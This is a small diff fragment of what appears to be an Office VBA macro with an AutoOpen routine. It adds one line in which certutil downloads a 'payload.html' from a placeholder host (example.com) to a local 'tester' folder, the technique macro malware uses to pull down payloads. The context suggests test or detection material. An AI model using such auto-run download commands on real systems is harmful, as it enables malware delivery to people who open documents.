@@ -66,5 +66,6 @@ Sub AutoOpen()
         "", "", 1
 End Sub
 
+C:\Windows\System32\certutil.exe -urlcache -split -f https://example.com/payload.html C:\tester\payload.html
 
 
